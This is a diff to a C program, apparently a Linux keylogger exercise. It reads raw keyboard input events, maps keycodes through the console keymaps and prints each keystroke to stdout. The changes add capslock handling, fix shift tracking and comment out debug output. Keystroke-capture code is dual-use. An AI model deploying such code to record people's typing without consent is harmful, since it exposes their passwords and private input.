@@ -347,14 +347,15 @@ typedef struct 	s_modifiers
 }				t_modifiers;
 
 t_modifiers modifiers[] = {
-	{ 0, 				KG_SHIFT,	"shift"},
-	{ KEY_RIGHTALT, 	KG_ALTGR,	"altgr"},
-	{ 0, 				KG_CTRL,	"control"},
-	{ KEY_LEFTALT, 		KG_ALT,		"alt"},
-	{ KEY_LEFTSHIFT, 	KG_SHIFTL,	"shiftl"},
-	{ KEY_RIGHTSHIFT, 	KG_SHIFTR,	"shiftr"},
-	{ KEY_LEFTCTRL, 	KG_CTRLL,	"ctrll"},
-	{ KEY_RIGHTCTRL, 	KG_CTRLR,	"ctrlr"}
+	{ 0, 				KG_SHIFT,		"shift"},
+	{ KEY_RIGHTALT, 	KG_ALTGR,		"altgr"},
+	{ 0, 				KG_CTRL,		"control"},
+	{ KEY_LEFTALT, 		KG_ALT,			"alt"},
+	{ KEY_LEFTSHIFT, 	KG_SHIFTL,		"shiftl"},
+	{ KEY_RIGHTSHIFT, 	KG_SHIFTR,		"shiftr"},
+	{ KEY_LEFTCTRL, 	KG_CTRLL,		"ctrll"},
+	{ KEY_RIGHTCTRL, 	KG_CTRLR,		"ctrlr"},
+	{ KEY_CAPSLOCK, 	KG_CAPSSHIFT, 	"capslock"}
 };
 
 int						loop;
@@ -425,8 +426,8 @@ static int  		print_keysym(int code)
 	value = KVAL(code);
 	if (type >= syms_size) {
 		code = code ^ 0xf000;
-		// if (code < 0)
-//			return printf("(null) ");
+		if (code < 0)
+			return printf("(null) ");
 		if (code < 0x80)
 			return printf("%s ", iso646_syms[code]);
 		return printf("%#04x ", code);
@@ -507,7 +508,7 @@ static void				keylogger(int keybd, int **key_table, int nb_keys, int nb_keymap)
 		}
 		printf("\n");
 
-		int value = -1; // which key have been pressed
+		int value = 0; // which key have been pressed
 		int state = 0; // state 0: released 1:pressed 2:repeated
 		int key = 0;
 		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
@@ -545,16 +546,19 @@ static void				keylogger(int keybd, int **key_table, int nb_keys, int nb_keymap)
 					printf("%c", key);
 				else
 					print_keysym(key);
-				modifier++;
+				if (modifier & (1 << KG_SHIFTL) ||
+					modifier & (1 << KG_SHIFTR))
+					modifier++;
 			}
-			printf(" [%d][%d] -> ", value, modifier);
+			printf(" [%d][%d] (%d) -> ", value, modifier, K(KT_FN, value));
 			key = key_table[value][modifier];
 			if (isprintable(key))
 				printf("%c", key);
 			else
 				print_keysym(key);
 			printf("\n");
-			if (modifier)
+			if (modifier & (1 << KG_SHIFTL) ||
+				modifier & (1 << KG_SHIFTR))
 				modifier--;
 		}
 	}
@@ -615,7 +619,7 @@ int					main(void)
 		return 1;
 	}
 	for (int i = 0; i < sizeof(modifiers) / sizeof(*modifiers); i++) {
-		printf("%s\t%d\n", modifiers[i].name, modifiers[i].value);
+		printf("%s\t%d\t%d\n", modifiers[i].name, modifiers[i].bit, modifiers[i].value);
 	}
 	printf("keyboard: %s\n", keyboard);
 	free(keyboard);
@@ -684,7 +688,7 @@ int					get_keymaps(int fd, int keymaps[2][256])
 		} else {
 			keymaps[0][i] = -1;
 		}
-		printf("%03d %-5d %-15d %d\n", i, keymaps[0][i], keymaps[1][keymapnbr], keymapnbr);
+		// printf("%03d %-5d %-15d %d\n", i, keymaps[0][i], keymaps[1][keymapnbr], keymapnbr);
 	}
 	if (keymapnbr == 0)
 		fprintf(stderr, "cannot find any keymaps\n");
@@ -741,16 +745,16 @@ int 				**dump_keys(int fd, int nb_keys, int nb_keymap, int keymaps[2][256])
 		return NULL;
 	}
 	for (int i = 0; i < nb_keys; i++) {
-		printf("%03d(%s):\n", i, key[i].name);
+		// printf("%03d(%s):\n", i, key[i].name);
 		for (int j = 0; j < nb_keymap; j++) {
 			key_table[i][j] = get_bind(fd, i, keymaps[1][j]);
-			printf(">%03d %x", keymaps[1][j], key_table[i][j]);
-			if (isprintable(key_table[i][j]))
-				printf("(%c) ", key_table[i][j]);
-			else
-				print_keysym(key_table[i][j]);
+			// printf(">%03d %x", keymaps[1][j], key_table[i][j]);
+			// if (isprintable(key_table[i][j]))
+			// 	printf("(%c) ", key_table[i][j]);
+			// else
+			// 	print_keysym(key_table[i][j]);
 		}
-		printf("\n");
+		// printf("\n");
 	}
 	return key_table;
 }
